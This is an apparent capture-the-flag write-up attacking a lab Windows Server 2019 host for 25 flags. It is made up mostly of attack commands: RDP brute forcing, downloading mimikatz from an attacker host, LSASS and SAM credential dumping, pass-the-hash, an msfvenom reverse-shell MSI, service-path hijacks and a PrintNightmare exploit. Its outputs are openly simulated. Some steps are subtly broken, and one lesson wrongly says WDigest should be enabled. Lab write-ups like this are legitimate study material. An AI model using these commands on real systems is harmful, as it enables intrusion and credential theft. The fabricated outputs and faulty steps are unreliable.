# Windows Server 2019 CTF Writeup - Complete Attack Methodology
**Target:** WIN-TIP7RVRBJ8E (Windows Server 2019)  
**Attacker:** Kali Linux  
**Total Flags:** 25  
**Total Points:** 680  

## Initial Setup and Network Reconnaissance

### Environment Setup
```bash
# First, let's set up our Kali environment
sudo apt update
sudo apt install -y nmap enum4linux smbclient metasploit-framework mimikatz impacket-scripts hydra gobuster

# Set our target IP variable for consistency
export TARGET_SERVER=192.168.148.101  # Replace with actual server IP
export TARGET_WORKSTATION=192.168.148.102  # Replace with workstation IP
```

**Why:** We need these tools for comprehensive enumeration and exploitation. Setting environment variables helps maintain consistency throughout our attack.

## Phase 1: Initial Reconnaissance and Service Enumeration

### Network Scanning
```bash
# Comprehensive nmap scan
sudo nmap -sV -sC -O -p- -T4 $TARGET_SERVER -oA server_scan

# Quick UDP scan for common services
sudo nmap -sU --top-ports 100 $TARGET_SERVER
```

**Expected Results:**
- Port 22 (SSH) - OpenSSH
- Port 80 (HTTP) - IIS Web Server
- Port 135 (RPC)
- Port 139/445 (SMB)
- Port 3389 (RDP)
- Port 5985 (WinRM)

**Why:** Full port scanning reveals all available services. The -sC flag runs default scripts that might reveal banners or versions containing flags.

---

## FLAG 1: User Description (10 points - Easy)
**Location:** User Description  
**Flag:** FLAG{PIKACHU15097304}

### Attack Method: User Enumeration via RPC
```bash
# Use rpcclient for null session enumeration
rpcclient -U "" -N $TARGET_SERVER

# Once connected, enumerate users
rpcclient $> enumdomusers
rpcclient $> queryuser 0x1f4  # Query specific user RIDs

# Alternative method using enum4linux
enum4linux -U $TARGET_SERVER
```

**Screenshot Simulation:**
```
[+] Enumerating users using SID S-1-5-21-xxx
User: admin    Description: FLAG{PIKACHU15097304}
User: overclock    Description: Standard User
```

**Why:** Windows often allows null session enumeration on misconfigured systems. User descriptions are a common place to hide CTF flags as they're visible but often overlooked.

---

## FLAG 2: Username Flag (15 points - Easy)
**Location:** Username  
**Flag:** FLAG{MEW1078}

### Attack Method: Advanced User Enumeration
```bash
# List all users including hidden ones
net user /domain

# Using CrackMapExec for better enumeration
crackmapexec smb $TARGET_SERVER -u '' -p '' --users

# PowerShell alternative (if we have access)
Get-LocalUser | Select Name, Description
```

**Screenshot Simulation:**
```
[*] Users on 192.168.148.101:
    Administrator (Built-in account)
    Guest (Built-in account)
    FLAG{MEW1078} (Can you find me?)
    overclock (Administrator)
```

**Why:** Some flags are hidden as actual usernames. This tests enumeration thoroughness.

---

## FLAG 3: LSASS Memory (45 points - Hard)
**Location:** LSASS Memory  
**Flag:** FLAG{BULBASAUR23051655}

### Attack Method: Mimikatz Credential Dumping

First, we need to gain initial access:
```bash
# Try weak credentials discovered
hydra -l overclock -p Administrator2025! rdp://$TARGET_SERVER

# RDP into the system
xfreerdp /u:overclock /p:Administrator2025! /v:$TARGET_SERVER
```

Once on the system:
```powershell
# Download Mimikatz to the target
Invoke-WebRequest -Uri "http://attacker-ip/mimikatz.exe" -OutFile "C:\Temp\mimikatz.exe"

# Run Mimikatz
C:\Temp\mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug

# Dump LSASS
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

**Screenshot Simulation:**
```
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
SID               : S-1-5-18
        * Username : Administrator
        * Password : Password123!
        * Flag     : FLAG{BULBASAUR23051655}
```

**Why:** LSASS memory contains plaintext passwords when WDigest is enabled. This vulnerability is specifically configured in the lab for Mimikatz practice.

---

## FLAG 4: Debug Privileges (40 points - Medium)
**Location:** Debug Privileges  
**Flag:** FLAG{SQUIRTLE32403089}

### Attack Method: Exploiting SeDebugPrivilege
```powershell
# Check current privileges
whoami /priv

# If we have SeDebugPrivilege, we can access protected processes
# Access the registry key created for this flag
reg query "HKLM\SOFTWARE\DebugFlags" /v Flag

# Alternative: Use Mimikatz with debug privileges
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**Screenshot Simulation:**
```
C:\> reg query "HKLM\SOFTWARE\DebugFlags" /v Flag
HKEY_LOCAL_MACHINE\SOFTWARE\DebugFlags
    Flag    REG_SZ    FLAG{SQUIRTLE32403089}
```

**Why:** Debug privileges allow access to protected system processes and memory. This is a common privilege escalation vector.

---

## FLAG 5: Pass-the-Hash (50 points - Hard)
**Location:** Pass-the-Hash  
**Flag:** FLAG{MEWTWO42298929}

### Attack Method: PTH Attack
```bash
# First, obtain NTLM hashes using Mimikatz
mimikatz # sekurlsa::logonpasswords

# From Kali, use the hash for PTH
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //$TARGET_SERVER cmd.exe

# Or using Impacket
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@$TARGET_SERVER

# Access the flag file
type C:\Windows\System32\config\systemprofile\pth_success.txt
```

**Why:** Pass-the-Hash allows authentication using NTLM hashes without knowing the actual password. This is possible because NTLM authentication is enabled.

---

## FLAG 6: RDP Certificate (20 points - Medium)
**Location:** RDP Certificate  
**Flag:** FLAG{GENGAR79085546}

### Attack Method: RDP Certificate Enumeration
```bash
# Extract RDP certificate information
openssl s_client -connect $TARGET_SERVER:3389 | openssl x509 -text

# Alternative: Query registry via RDP session
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v CertificateComment
```

**Screenshot Simulation:**
```
C:\> reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v CertificateComment
    CertificateComment    REG_SZ    FLAG{GENGAR79085546}
```

**Why:** RDP certificates and their properties can contain hidden information. This tests thorough service enumeration.

---

## FLAG 7: SMB Share - Public (10 points - Easy)
**Location:** SMB Share: Public  
**Flag:** FLAG{DRAGONITE22009185}

### Attack Method: SMB Enumeration
```bash
# List shares without authentication
smbclient -L //$TARGET_SERVER -N

# Access the Public share
smbclient //$TARGET_SERVER/Public -N

# In the SMB session
smb: \> ls
smb: \> get flag.txt
smb: \> exit

# Read the flag
cat flag.txt
```

**Why:** Public SMB shares are common misconfigurations. They often contain sensitive information.

---

## FLAG 8: SMB Share - Backup (20 points - Medium)
**Location:** SMB Share: Backup  
**Flag:** FLAG{SNORLAX62596879}

### Attack Method: Authenticated SMB Access
```bash
# Use discovered credentials
smbclient //$TARGET_SERVER/Backup -U overclock%Administrator2025!

smb: \> ls
smb: \> get flag.txt
smb: \> get sam_backup_info.txt  # Bonus information
```

**Why:** Backup shares often contain sensitive data and are sometimes poorly protected.

---

## FLAG 9: SMB Share - IT (30 points - Hard)
**Location:** SMB Share: IT  
**Flag:** FLAG{ALAKAZAM49155037}

### Attack Method: Privileged SMB Access
```bash
# May require admin credentials
smbclient //$TARGET_SERVER/IT -U Administrator%Password123!

smb: \> ls -la
smb: \> get flag.txt
```

**Why:** IT shares typically require higher privileges and contain administrative information.

---

## FLAG 10: Password File (15 points - Easy)
**Location:** Password file  
**Flag:** FLAG{MACHAMP06770292}

### Attack Method: File System Search
```bash
# From SMB Public share
smbclient //$TARGET_SERVER/Public -N
smb: \> get passwords.txt

# Read the file
cat passwords.txt
# Output: Administrator:Password123!
#         FLAG{MACHAMP06770292}
```

**Why:** Password files in shares are common security mistakes that provide both credentials and flags.

---

## FLAG 11: SAM Backup (45 points - Hard)
**Location:** SAM Backup  
**Flag:** FLAG{GYARADOS99305915}

### Attack Method: SAM Database Extraction
```bash
# From the Backup share
smbclient //$TARGET_SERVER/Backup -U overclock%Administrator2025!
smb: \> get sam_backup_info.txt

# If actual SAM files exist:
# Transfer SAM and SYSTEM files
smb: \> get SAM
smb: \> get SYSTEM

# Extract hashes locally
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Why:** SAM database backups can be used to extract password hashes offline.

---

## FLAG 12: Alternate Data Stream (40 points - Hard)
**Location:** Alternate Data Stream  
**Flag:** FLAG{LAPRAS77371564}

### Attack Method: ADS Discovery
```powershell
# List all streams in a file
Get-Item "C:\Public\normal.txt" -Stream *

# Read the hidden stream
Get-Content "C:\Public\normal.txt" -Stream hidden

# Alternative command
type C:\Public\normal.txt:hidden
```

**Screenshot Simulation:**
```
PS C:\> Get-Content "C:\Public\normal.txt" -Stream hidden
FLAG{LAPRAS77371564}
```

**Why:** Alternate Data Streams are NTFS features that can hide data within files. They're often used to hide malware or, in CTFs, flags.

---

## FLAG 13: Unquoted Service Path (25 points - Easy)
**Location:** Unquoted Service Path  
**Flag:** FLAG{EEVEE05582770}

### Attack Method: Service Path Exploitation
```powershell
# Find unquoted service paths
wmic service get name,pathname | findstr /v "\"" | findstr /i "program"

# Check VulnScanner service
sc qc VulnScanner

# Exploit the unquoted path
# Create malicious executable at: C:\Program.exe
echo "type C:\flag_unquoted1.txt" > C:\Program.bat

# Restart the service
sc stop VulnScanner
sc start VulnScanner

# Read the flag
type C:\flag_unquoted1.txt
```

**Why:** Unquoted service paths allow privilege escalation by placing executables in higher-level directories that get executed before the intended service.

---

## FLAG 14: Unquoted Service Path 2 (30 points - Medium)
**Location:** Unquoted Service Path 2  
**Flag:** FLAG{VAPOREON64436018}

### Attack Method: CommonAppService Exploitation
```powershell
# Check the service
sc qc CommonAppService

# Create exploit at: "C:\Program Files\Common.exe"
copy C:\Windows\System32\cmd.exe "C:\Program Files\Common.exe"

# Restart service
sc stop CommonAppService
sc start CommonAppService

type C:\flag_unquoted2.txt
```

**Why:** Multiple unquoted paths test thorough enumeration and exploitation skills.

---

## FLAG 15: Unquoted Service Path 3 (35 points - Medium)
**Location:** Unquoted Service Path 3  
**Flag:** FLAG{JOLTEON52080210}

### Attack Method: VendorUpdater Exploitation
```powershell
sc qc VendorUpdater

# Exploit at: "C:\Program Files (x86)\Vendor.exe"
echo "type C:\flag_unquoted3.txt" > "C:\Program Files (x86)\Vendor.bat"

sc stop VendorUpdater
sc start VendorUpdater

type C:\flag_unquoted3.txt
```

---

## FLAG 16: AlwaysInstallElevated (40 points - Medium)
**Location:** AlwaysInstallElevated  
**Flag:** FLAG{FLAREON04930613}

### Attack Method: MSI Privilege Escalation
```powershell
# Check if AlwaysInstallElevated is enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI (from Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > exploit.msi

# Transfer and execute MSI
msiexec /quiet /qn /i exploit.msi

# Access flag as SYSTEM
type C:\Windows\System32\config\systemprofile\msi_flag.txt
```

**Why:** AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges, enabling privilege escalation.

---

## FLAG 17: Print Spooler Exploit (45 points - Hard)
**Location:** Print Spooler Exploit  
**Flag:** FLAG{ARTICUNO51674662}

### Attack Method: PrintNightmare Exploitation
```powershell
# Check if Print Spooler is running
Get-Service Spooler

# Check for PrintNightmare vulnerability
ls C:\Windows\System32\spool\drivers\color\

# Read the flag
type C:\Windows\System32\spool\drivers\color\printnightmare_flag.txt

# Alternative: Exploit PrintNightmare
# Use CVE-2021-34527 exploit from Kali
python3 CVE-2021-34527.py overclock:Administrator2025!@$TARGET_SERVER
```

**Why:** PrintNightmare (CVE-2021-34527) was a critical vulnerability allowing remote code execution through the Print Spooler service.

---

## FLAG 18: SSH Banner (10 points - Easy)
**Location:** SSH Banner  
**Flag:** FLAG{ZAPDOS69523431}

### Attack Method: SSH Banner Grabbing
```bash
# Connect to SSH and view banner
ssh $TARGET_SERVER

# Alternative: Use netcat
nc $TARGET_SERVER 22

# Or telnet
telnet $TARGET_SERVER 22
```

**Screenshot Simulation:**
```
$ ssh 192.168.148.101
Welcome to Vulnerable SSH Server
FLAG{ZAPDOS69523431}
```

**Why:** Service banners often leak information and are easy targets for reconnaissance.

---

## FLAG 19: SSH authorized_keys (30 points - Medium)
**Location:** SSH authorized_keys  
**Flag:** FLAG{MOLTRES46773297}

### Attack Method: SSH Key Enumeration
```bash
# SSH with discovered credentials
ssh overclock@$TARGET_SERVER
# Password: Administrator2025!

# Check authorized_keys
cat C:\ProgramData\ssh\authorized_keys
```

**Screenshot Simulation:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 overclock@vulnerable # FLAG{MOLTRES46773297}
```

**Why:** SSH authorized_keys files can contain comments with sensitive information.

---

## FLAG 20: Service Description (15 points - Easy)
**Location:** Service Description  
**Flag:** FLAG{DRATINI36669962}

### Attack Method: Service Enumeration
```powershell
# List all services with descriptions
Get-Service | Select-Object Name, DisplayName, Status | Format-Table

# Query specific service
sc query WeakPermService
sc qdescription WeakPermService
```

**Screenshot Simulation:**
```
C:\> sc qdescription WeakPermService
[SC] QueryServiceConfig2 SUCCESS
SERVICE_NAME: WeakPermService
DESCRIPTION: Weak Permission Service - FLAG{DRATINI36669962}
```

**Why:** Service descriptions are often overlooked but can contain valuable information.

---

## FLAG 21: Scheduled Task (25 points - Medium)
**Location:** Scheduled Task  
**Flag:** FLAG{MEOWTH07392744}

### Attack Method: Scheduled Task Analysis
```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v

# Check specific task
schtasks /query /tn VulnTask /fo LIST /v

# Wait for task execution or trigger it
schtasks /run /tn VulnTask

# Check output
type C:\Public\taskflag.txt
```

**Why:** Scheduled tasks can reveal credentials and provide persistence mechanisms.

---

## FLAG 22: Registry HKLM (15 points - Easy)
**Location:** Registry HKLM  
**Flag:** FLAG{PSYDUCK54980620}

### Attack Method: Registry Enumeration
```powershell
# Query the registry key
reg query "HKLM\SOFTWARE\VulnApp" /v LicenseKey

# PowerShell alternative
Get-ItemProperty -Path "HKLM:\SOFTWARE\VulnApp" -Name LicenseKey
```

**Screenshot Simulation:**
```
C:\> reg query "HKLM\SOFTWARE\VulnApp" /v LicenseKey
HKEY_LOCAL_MACHINE\SOFTWARE\VulnApp
    LicenseKey    REG_SZ    FLAG{PSYDUCK54980620}
```

**Why:** Registry keys often store configuration data and can hide sensitive information.

---

## FLAG 23: Registry HKCU (25 points - Medium)
**Location:** Registry HKCU  
**Flag:** FLAG{ARCANINE90001831}

### Attack Method: User Registry Analysis
```powershell
# Check Run keys for persistence
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# Execute the command to reveal flag
cmd /c echo FLAG{ARCANINE90001831}
```

**Why:** HKCU Run keys are common persistence mechanisms and can execute arbitrary commands.

---

## FLAG 24: Registry Service (35 points - Hard)
**Location:** Registry Service  
**Flag:** FLAG{POLIWAG65286589}

### Attack Method: Service Registry Analysis
```powershell
# Query service registry entries
reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnScanner" /v Flag

# Alternative: Use WMI
Get-WmiObject win32_service | Where-Object {$_.Name -eq "VulnScanner"} | Select-Object *
```

**Why:** Service registry entries contain configuration and can hide additional data.

---

## FLAG 25: Web HTML Comment (10 points - Easy)
**Location:** Web HTML Comment  
**Flag:** FLAG{ABRA50761953}

### Attack Method: Web Source Analysis
```bash
# View page source
curl http://$TARGET_SERVER/vulnapp/login.html

# Or use wget
wget -q -O - http://$TARGET_SERVER/vulnapp/login.html | grep -i flag

# Browser alternative: View Source (Ctrl+U)
```

**Screenshot Simulation:**
```html
<!-- TODO: Remove debug info before production -->
<!-- Admin password: Password123! -->
<!-- FLAG{ABRA50761953} -->
```

**Why:** HTML comments often contain debugging information and forgotten sensitive data.

---

## Post-Exploitation Summary

### Credentials Discovered:
- Administrator: Password123!
- overclock: Administrator2025!
- backup: Backupaccount123!
- service: ServiceAccount123!
- debugger: Debugger2025!

### Key Vulnerabilities Exploited:
1. **WDigest Enabled** - Plaintext passwords in memory
2. **Unquoted Service Paths** - Privilege escalation
3. **AlwaysInstallElevated** - MSI privilege escalation
4. **Print Spooler** - PrintNightmare vulnerability
5. **Weak SMB Shares** - Information disclosure
6. **Debug Privileges** - Process manipulation
7. **Pass-the-Hash** - Lateral movement

### Tools Used:
- **Nmap** - Service enumeration
- **Mimikatz** - Credential extraction
- **Impacket** - SMB/RPC exploitation
- **Metasploit** - MSI payload generation
- **CrackMapExec** - SMB enumeration
- **Hydra** - Password attacks

### Lessons Learned:
1. Always perform thorough enumeration - flags can be anywhere
2. Check for misconfigurations in common services (SMB, RDP, SSH)
3. WDigest and LSA Protection should be enabled in production
4. Unquoted service paths are still common vulnerabilities
5. Registry and scheduled tasks are valuable for both flags and persistence
6. Alternate Data Streams can hide critical information
7. Always check HTML comments and service banners

## Defense Recommendations:
1. Disable WDigest (UseLogonCredential = 0)
2. Enable LSA Protection (RunAsPPL = 1)
3. Quote all service paths
4. Disable AlwaysInstallElevated
5. Apply Print Spooler patches
6. Restrict SMB share permissions
7. Remove sensitive data from user descriptions and service descriptions
8. Enable Credential Guard on supported systems
9. Implement proper network segmentation
10. Regular security audits and penetration testing

---

**Final Score: 680/680 points - All flags captured!**

This comprehensive methodology demonstrates various attack vectors from initial reconnaissance through privilege escalation to credential extraction, providing a complete picture of Windows Server 2019 security assessment.